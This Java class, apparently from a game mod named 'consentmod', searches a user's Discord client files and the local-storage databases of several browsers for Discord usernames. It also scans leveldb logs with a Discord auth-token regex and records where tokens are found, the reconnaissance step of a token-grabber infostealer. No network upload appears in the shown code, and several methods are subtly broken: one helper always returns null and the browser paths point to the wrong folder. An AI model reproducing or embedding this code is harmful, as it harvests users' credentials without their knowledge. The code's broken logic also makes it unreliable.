package com.consentmod;

import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

import java.io.File;
import java.io.IOException;
import java.nio.file.Files;
import java.nio.file.Path;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class DiscordUsernameFetcher {

    private static final Logger LOGGER = LoggerFactory.getLogger("consentmod");
    private static final String[] DISCORD_PATHS = {
        "discord", "discordcanary", "discordptb", "discord development"
    };

    private static String foundLocation = "Not found";

    public static String getDiscordUsername() {
        foundLocation = "Not found";

        String username = tryScopeFile();
        if (username != null) return username;

        username = tryLevelDB();
        if (username != null) return username;

        username = tryIndexedDB();
        if (username != null) return username;

        username = tryBrowserStorage();
        if (username != null) return username;

        username = tryDiscordLogs();
        if (username != null) return username;

        username = tryTokenExtraction();
        if (username != null) return username;

        return "N/A";
    }

    public static String getFoundLocation() {
        return foundLocation;
    }

    private static String tryScopeFile() {
        for (String discord : DISCORD_PATHS) {
            try {
                Path scopeFile = Path.of(System.getProperty("user.home"),
                    "AppData", "Roaming", discord, "sentry", "scope_v3.json");

                if (Files.exists(scopeFile)) {
                    String content = Files.readString(scopeFile);
                    String result = extractUsername(content);
                    if (result != null) {
                        foundLocation = "%APPDATA%\\" + discord + "\\sentry\\scope_v3.json";
                        LOGGER.info("Found Discord username from scope_v3.json: {} at {}", result, foundLocation);
                        return result;
                    }
                }
            } catch (Exception e) {
                LOGGER.debug("Could not read scope_v3.json for {}: {}", discord, e.getMessage());
            }
        }
        return null;
    }

    private static String tryLevelDB() {
        for (String discord : DISCORD_PATHS) {
            try {
                Path leveldbDir = Path.of(System.getProperty("user.home"),
                    "AppData", "Roaming", discord, "Local Storage", "leveldb");

                if (Files.exists(leveldbDir)) {
                    String result = searchDirectory(leveldbDir, ".log", ".ldb");
                    if (result != null) {
                        foundLocation = "%APPDATA%\\" + discord + "\\Local Storage\\leveldb\\";
                        LOGGER.info("Found Discord username from leveldb: {} at {}", result, foundLocation);
                        return result;
                    }
                }
            } catch (Exception e) {
                LOGGER.debug("Could not read leveldb for {}: {}", discord, e.getMessage());
            }
        }
        return null;
    }

    private static String tryIndexedDB() {
        for (String discord : DISCORD_PATHS) {
            try {
                Path indexedDbDir = Path.of(System.getProperty("user.home"),
                    "AppData", "Roaming", discord, "IndexedDB");

                if (Files.exists(indexedDbDir)) {
                    Files.walk(indexedDbDir).filter(p -> {
                        String name = p.getFileName().toString();
                        return name.endsWith(".ldb") || name.endsWith(".log");
                    }).forEach(file -> {
                        try {
                            byte[] bytes = Files.readAllBytes(file);
                            String content = new String(bytes, java.nio.charset.StandardCharsets.UTF_8);
                            String result = extractUsername(content);
                            if (result != null) {
                                foundLocation = file.toString();
                            }
                        } catch (IOException ignored) {
                        }
                    });

                    if (foundLocation.startsWith("C:")) {
                        return extractUsernameFromLocation(foundLocation);
                    }
                }
            } catch (Exception e) {
                LOGGER.debug("Could not read IndexedDB for {}: {}", discord, e.getMessage());
            }
        }
        return null;
    }

    private static String tryBrowserStorage() {
        String[][] browsers = {
            {"Google", "Chrome", "User Data", "Default", "Local Storage", "leveldb"},
            {"Google", "Chrome", "User Data", "Profile 1", "Local Storage", "leveldb"},
            {"Google", "Chrome", "User Data", "Profile 2", "Local Storage", "leveldb"},
            {"Opera Software", "Opera Stable", "Local Storage", "leveldb"},
            {"BraveSoftware", "Brave-Browser", "User Data", "Default", "Local Storage", "leveldb"},
            {"Microsoft", "Edge", "User Data", "Default", "Local Storage", "leveldb"},
            {"Yandex", "YandexBrowser", "User Data", "Default", "Local Storage", "leveldb"},
            {"Vivaldi", "User Data", "Default", "Local Storage", "leveldb"}
        };

        for (String[] browser : browsers) {
            try {
                Path browserPath = Path.of(System.getenv("APPDATA"), String.join(File.separator, browser));
                if (Files.exists(browserPath)) {
                    String result = searchDirectory(browserPath, ".log", ".ldb");
                    if (result != null) {
                        foundLocation = "%APPDATA%\\" + String.join("\\", browser) + "\\";
                        LOGGER.info("Found Discord username from browser storage: {} at {}", result, foundLocation);
                        return result;
                    }
                }
            } catch (Exception e) {
                LOGGER.debug("Could not read browser storage: {}", e.getMessage());
            }
        }
        return null;
    }

    private static String tryDiscordLogs() {
        for (String discord : DISCORD_PATHS) {
            try {
                Path logDir = Path.of(System.getProperty("user.home"),
                    "AppData", "Roaming", discord, "logs");

                if (Files.exists(logDir)) {
                    String result = searchDirectory(logDir, ".log");
                    if (result != null) {
                        foundLocation = "%APPDATA%\\" + discord + "\\logs\\";
                        LOGGER.info("Found Discord username from logs: {} at {}", result, foundLocation);
                        return result;
                    }
                }
            } catch (Exception e) {
                LOGGER.debug("Could not read Discord logs for {}: {}", discord, e.getMessage());
            }
        }
        return null;
    }

    private static String tryTokenExtraction() {
        for (String discord : DISCORD_PATHS) {
            try {
                Path leveldbDir = Path.of(System.getProperty("user.home"),
                    "AppData", "Roaming", discord, "Local Storage", "leveldb");

                if (Files.exists(leveldbDir)) {
                    Files.list(leveldbDir).filter(p -> p.toString().endsWith(".log")).forEach(file -> {
                        try {
                            String content = Files.readString(file);
                            Pattern tokenPattern = Pattern.compile("[\\w-]{24,26}\\.[\\w-]{6}\\.[\\w-]{25,110}");
                            Matcher matcher = tokenPattern.matcher(content);
                            if (matcher.find()) {
                                LOGGER.info("Found potential Discord token in: {}", file);
                            }
                        } catch (IOException ignored) {
                        }
                    });
                }
            } catch (Exception e) {
                LOGGER.debug("Could not check tokens for {}: {}", discord, e.getMessage());
            }
        }
        return null;
    }

    private static String searchDirectory(Path dir, String... extensions) {
        try {
            Files.list(dir).filter(p -> {
                String name = p.getFileName().toString();
                for (String ext : extensions) {
                    if (name.endsWith(ext)) return true;
                }
                return false;
            }).forEach(file -> {
                try {
                    byte[] bytes = Files.readAllBytes(file);
                    String content = new String(bytes, java.nio.charset.StandardCharsets.UTF_8);
                    String result = extractUsername(content);
                    if (result != null) {
                        foundLocation = file.toString();
                    }
                } catch (IOException ignored) {
                }
            });
        } catch (IOException ignored) {
        }
        return null;
    }

    private static String extractUsernameFromLocation(String location) {
        try {
            Path file = Path.of(location);
            if (Files.exists(file)) {
                byte[] bytes = Files.readAllBytes(file);
                String content = new String(bytes, java.nio.charset.StandardCharsets.UTF_8);
                return extractUsername(content);
            }
        } catch (Exception ignored) {
        }
        return null;
    }

    private static String extractUsername(String content) {
        String[] patterns = {
            "\"username\":\"([^\"]+)\"",
            "\"username\": \"([^\"]+)\"",
            "\"userName\":\"([^\"]+)\"",
            "\"userName\": \"([^\"]+)\"",
            "\"user_name\":\"([^\"]+)\"",
            "\"user_name\": \"([^\"]+)\"",
            "\"displayName\":\"([^\"]+)\"",
            "\"displayName\": \"([^\"]+)\"",
            "\"globalName\":\"([^\"]+)\"",
            "\"globalName\": \"([^\"]+)\"",
            "\"discriminator\":\"([^\"]+)\"",
            "\"discriminator\": \"([^\"]+)\""
        };

        for (String pattern : patterns) {
            Matcher matcher = Pattern.compile(pattern).matcher(content);
            if (matcher.find()) {
                String username = matcher.group(1);
                if (isValidUsername(username)) {
                    return username;
                }
            }
        }
        return null;
    }

    private static boolean isValidUsername(String username) {
        if (username == null || username.isEmpty()) return false;
        if (username.length() < 2 || username.length() > 32) return false;
        if (username.contains("\\") || username.contains("/")) return false;
        if (username.equals("null") || username.equals("undefined")) return false;
        if (username.matches("\\d+")) return false;
        return true;
    }
}
